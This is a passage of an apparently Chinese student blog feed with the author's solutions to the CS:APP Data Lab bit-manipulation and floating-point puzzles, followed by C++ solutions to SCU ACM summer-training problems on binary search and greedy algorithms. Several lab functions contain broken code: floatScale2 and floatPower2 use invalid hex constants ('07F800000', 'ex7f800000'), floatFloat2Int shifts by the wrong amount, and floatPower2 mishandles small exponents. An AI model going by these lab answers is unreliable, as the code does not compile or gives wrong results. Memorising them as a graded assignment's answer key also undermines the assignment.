  Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span><br><span class="hljs-comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *   Max ops: 12</span><br><span class="hljs-comment"> *   Rating: 4 </span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">logicalNeg</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>     <span class="hljs-keyword">return</span> ((x | (~x + <span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">31</span>) + <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>多少个bit位能表示一个数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* howManyBits - return the minimum number of bits required to represent x in</span><br><span class="hljs-comment"> *             two&#x27;s complement</span><br><span class="hljs-comment"> *  Examples: howManyBits(12) = 5</span><br><span class="hljs-comment"> *            howManyBits(298) = 10</span><br><span class="hljs-comment"> *            howManyBits(-5) = 4</span><br><span class="hljs-comment"> *            howManyBits(0)  = 1</span><br><span class="hljs-comment"> *            howManyBits(-1) = 1</span><br><span class="hljs-comment"> *            howManyBits(0x80000000) = 32</span><br><span class="hljs-comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span><br><span class="hljs-comment"> *  Max ops: 90</span><br><span class="hljs-comment"> *  Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">howManyBits</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>  <span class="hljs-type">int</span> b16,b8,b4,b2,b1,b0;<br>  <span class="hljs-type">int</span> flag = x &gt;&gt; <span class="hljs-number">31</span>;<br>  x = (flag &amp; ~x) | (~flag &amp; x);<span class="hljs-comment">//整数不变，负数取反</span><br>  b16 = !!(x &gt;&gt; <span class="hljs-number">16</span>) &lt;&lt; <span class="hljs-number">4</span>;<span class="hljs-comment">//高16位是否有1</span><br>  x = x &gt;&gt; b16;<br>  b8 = !!(x &gt;&gt; <span class="hljs-number">8</span>) &lt;&lt; <span class="hljs-number">3</span>;<span class="hljs-comment">//剩余给高八位</span><br>  x = x &gt;&gt; b8;<br>  b4 = !!(x &gt;&gt; <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">2</span>;<br>  x = x &gt;&gt; b4;<br>  b2 = !!(x &gt;&gt; <span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-number">1</span>;<br>  x = x &gt;&gt; b2;<br>  b1 = !!(x &gt;&gt; <span class="hljs-number">1</span>);<br>  x = x &gt;&gt; b1;<br>  b0 = x;<br>  <span class="hljs-keyword">return</span> b16 + b8 + b4 + b2 + b1 + b0 + <span class="hljs-number">1</span>; <br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-乘一个浮点数"><a href="#2-乘一个浮点数" class="headerlink" title="2 乘一个浮点数"></a>2 乘一个浮点数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">floatScale2</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> exp = (uf &amp; <span class="hljs-number">07F</span>800000) &gt;&gt; <span class="hljs-number">23</span>;<br>    <span class="hljs-type">unsigned</span> sign = uf &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">unsigned</span> frac = uf &amp; <span class="hljs-number">0X7FFFFF</span>;<br>    <span class="hljs-type">unsigned</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(exp == <span class="hljs-number">255</span>) <span class="hljs-keyword">return</span> uf;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(exp == <span class="hljs-number">0</span>) &#123; <br>    frac = frac &lt;&lt; <span class="hljs-number">1</span>;<br>        res = (sign &lt;&lt; <span class="hljs-number">31</span>) | (exp &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123; <br>        exp++;<br>        res = (sign &lt;&lt; <span class="hljs-number">31</span>) | (exp &lt;&lt; <span class="hljs-number">23</span>) | frac;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="浮点数转化为整数"><a href="#浮点数转化为整数" class="headerlink" title="浮点数转化为整数"></a>浮点数转化为整数</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span><br><span class="hljs-comment"> *   for floating point argument f.</span><br><span class="hljs-comment"> *   Argument is passed as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point value.</span><br><span class="hljs-comment"> *   Anything out of range (including NaN and infinity) should return</span><br><span class="hljs-comment"> *   0x80000000u.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">floatFloat2Int</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-type">unsigned</span> exp = (uf &amp; <span class="hljs-number">0x7F800000</span>) &gt;&gt; <span class="hljs-number">23</span>;<br>    <span class="hljs-type">int</span> sign = uf &gt;&gt; <span class="hljs-number">31</span> &amp; <span class="hljs-number">1</span>;<br>    <span class="hljs-type">unsigned</span> frac = uf &amp; <span class="hljs-number">0x7FFFFF</span>;<br>    <span class="hljs-type">int</span> E = exp - <span class="hljs-number">127</span>;<br>    <span class="hljs-keyword">if</span>(E &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>  <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(E &gt; <span class="hljs-number">31</span>) &#123; <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0x80000000</span>u;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        frac = frac | <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">23</span>;<br>        <span class="hljs-keyword">if</span>(E &lt; <span class="hljs-number">23</span>) &#123; <br>        frac = frac &gt;&gt; (<span class="hljs-number">23</span> - E);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123; <br>        frac = frac &lt;&lt; (E - <span class="hljs-number">3</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(sign) <span class="hljs-keyword">return</span> -frac;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> frac;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="求2-x"><a href="#求2-x" class="headerlink" title="求2^x"></a>求2^x</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span><br><span class="hljs-comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The unsigned value that is returned should have the identical bit</span><br><span class="hljs-comment"> *   representation as the single-precision floating-point number 2.0^x.</span><br><span class="hljs-comment"> *   If the result is too small to be represented as a denorm, return</span><br><span class="hljs-comment"> *   0. If too large, return +INF.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span><br><span class="hljs-comment"> *   Max ops: 30 </span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-title">floatPower2</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>    <span class="hljs-type">int</span> inf = ex7f800000;<br>    <span class="hljs-keyword">if</span>(x &lt; <span class="hljs-number">-126</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(x &gt; <span class="hljs-number">127</span>) <span class="hljs-keyword">return</span> inf;<br>    <span class="hljs-keyword">return</span> (x + <span class="hljs-number">127</span>) &lt;&lt; <span class="hljs-number">23</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/lab1.png"></p>]]></content>
    
    
    <categories>
      
      <category>lab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SCU_ACM预备队暑期训练</title>
    <link href="/2021/08/01/SCUACM/"/>
    <url>/2021/08/01/SCUACM/</url>
    
    <content type="html"><![CDATA[<h4 id="01-二分与贪心"><a href="#01-二分与贪心" class="headerlink" title="01-二分与贪心"></a>01-二分与贪心</h4><h5 id="合并果子：https-www-luogu-com-cn-problem-P1090"><a href="#合并果子：https-www-luogu-com-cn-problem-P1090" class="headerlink" title="合并果子：https://www.luogu.com.cn/problem/P1090"></a>合并果子：<a href="https://www.luogu.com.cn/problem/P1090">https://www.luogu.com.cn/problem/P1090</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>priority_queue&lt;<span class="hljs-type">int</span>,vector&lt;<span class="hljs-type">int</span>&gt;,greater&lt;<span class="hljs-type">int</span>&gt;&gt; q;<span class="hljs-comment">//默认是大顶堆，要加参数改成小顶堆</span><br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)&#123; <br><span class="hljs-type">int</span> x;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;x);<br>q.<span class="hljs-built_in">push</span>(x);<br>&#125;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n - <span class="hljs-number">1</span>; ++i)&#123; <br><span class="hljs-type">int</span> a = q.<span class="hljs-built_in">top</span>(); q.<span class="hljs-built_in">pop</span>();<br><span class="hljs-type">int</span> b = q.<span class="hljs-built_in">top</span>(); q.<span class="hljs-built_in">pop</span>();<br>ans += a + b;<span class="hljs-comment">//每次取队列的最小两个值</span><br>a += b;<br>q.<span class="hljs-built_in">push</span>(a);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,ans);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="进击的奶牛：https-www-luogu-com-cn-problem-P1824"><a href="#进击的奶牛：https-www-luogu-com-cn-problem-P1824" class="headerlink" title="进击的奶牛：https://www.luogu.com.cn/problem/P1824"></a>进击的奶牛：<a href="https://www.luogu.com.cn/problem/P1824">https://www.luogu.com.cn/problem/P1824</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> a[N],n,c;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123; <br>    <span class="hljs-type">int</span> now = a[<span class="hljs-number">1</span>], cnt = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; ++i)&#123; <br>        <span class="hljs-keyword">if</span>(a[i] - now &gt;= x)&#123; <br>            now = a[i];<br>            cnt++;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(cnt &gt;= c) <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123; <br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;c);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)&#123; <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(a + <span class="hljs-number">1</span>,a + <span class="hljs-number">1</span> + n);<br>    <span class="hljs-type">int</span> l = <span class="hljs-number">1</span>,r = <span class="hljs-number">10000000</span>;<br>    <span class="hljs-keyword">while</span>(l + <span class="hljs-number">1</span> &lt; r)&#123; <br>        <span class="hljs-type">int</span> mid =  l+ r&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid))&#123; <br>            l = mid;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            r = mid;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,l);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="借教室：https-www-luogu-com-cn-problem-P1083"><a href="#借教室：https-www-luogu-com-cn-problem-P1083" class="headerlink" title="借教室：https://www.luogu.com.cn/problem/P1083"></a>借教室：<a href="https://www.luogu.com.cn/problem/P1083">https://www.luogu.com.cn/problem/P1083</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ll long long</span><br><span class="hljs-type">int</span> n,m;<br>ll a[N],r[N],d[N];<br><span class="hljs-type">int</span> s[N],t[N];<span class="hljs-comment">//每个订单开始的时间和结束的时间</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span>&#123; <br>    <span class="hljs-built_in">memset</span>(a,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span> a);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= x; ++i)&#123; <br>        a[s[i]] += d[i];<span class="hljs-comment">//起始天加租借数量</span><br>        a[t[i] + <span class="hljs-number">1</span>] -= d[i];<span class="hljs-comment">//结束天的后一天减租借数量</span><br>    &#125;<br>    ll now = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; ++i)&#123; <span class="hljs-comment">//循环一边。检查哪个订单超过了可以租借的数量</span><br>        now += a[i];<br>        <span class="hljs-keyword">if</span>(now &gt; r[i])<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123; <br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<span class="hljs-comment">//n天，m个订单</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n;++i)&#123; <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;r[i]);<span class="hljs-comment">//每天可以租借的教室数量</span><br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i&lt;= m; ++i)&#123; <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld%d%d&quot;</span>,&amp;d[i],&amp;s[i],&amp;t[i]);<span class="hljs-comment">//每个订单租借的教室数量，起始时间</span><br>    &#125;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> right = m + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(left + <span class="hljs-number">1</span> &lt; right)&#123; <br>        <span class="hljs-type">int</span> mid = (left + right) &gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">check</span>(mid))&#123;<br>            left = mid;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            right = mid;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(left == m)&#123; <br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;0&quot;</span>);<br>    &#125;<br><span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-1&quot;</span>),<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>,left + <span class="hljs-number">1</span>);<br>    &#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br></code></pre></td></tr></table></figure><h5 id="看电视：Problem-2037-hdu-edu-cn"><a href="#看电视：Problem-2037-hdu-edu-cn" class="headerlink" title="看电视：Problem - 2037 (hdu.edu.cn)"></a>看电视：<a href="https://acm.hdu.edu.cn/showproblem.php?pid=2037">Problem - 2037 (hdu.edu.cn)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">program</span>&#123; <br>    <span class="hljs-type">int</span> start;<br>    <span class="hljs-type">int</span> end;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    program temp;<br>    vector&lt;program&gt; p;<br>    <span class="hljs-type">int</span> now;<span class="hljs-comment">//记录当前的安排时间</span><br>    <span class="hljs-type">int</span> cnt;<br>    <span class="hljs-keyword">while</span>(cin &gt;&gt; n)&#123; <br>        p.<span class="hljs-built_in">clear</span>();<br>        now = <span class="hljs-number">0</span>;<br>        cnt = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0</span>)&#123; <br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123; <br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123; <br>                cin &gt;&gt; temp.start;<br>                cin &gt;&gt; temp.end;<br>                p.<span class="hljs-built_in">push_back</span>(temp);<br>            &#125;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = n - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)&#123; <br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)&#123; <br>                    <span class="hljs-keyword">if</span>(p[j].end &gt;= p[j + <span class="hljs-number">1</span>].end)&#123; <br>                        <span class="hljs-built_in">swap</span>(p[j],p[j + <span class="hljs-number">1</span>]);<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123; <br>                <span class="hljs-keyword">if</span>(now &lt;= p[i].start)&#123; <br>                    now = p[i].end;<br>                    cnt++;<br>                &#125;<br>            &#125;<br>            cout &lt;&lt; cnt &lt;&lt; endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="正整数序列，求一个平均数最大，长度不小于L的字段-2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net"><a href="#正整数序列，求一个平均数最大，长度不小于L的字段-2021SCUACM-预备队暑期训练01-二分与贪心-Virtual-Judge-vjudge-net" class="headerlink" title="正整数序列，求一个平均数最大，长度不小于L的字段:2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)"></a>正整数序列，求一个平均数最大，长度不小于L的字段:<a href="https://vjudge.net/contest/450579#problem/C">2021SCUACM-预备队暑期训练01-二分与贪心 - Virtual Judge (vjudge.net)</a></h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 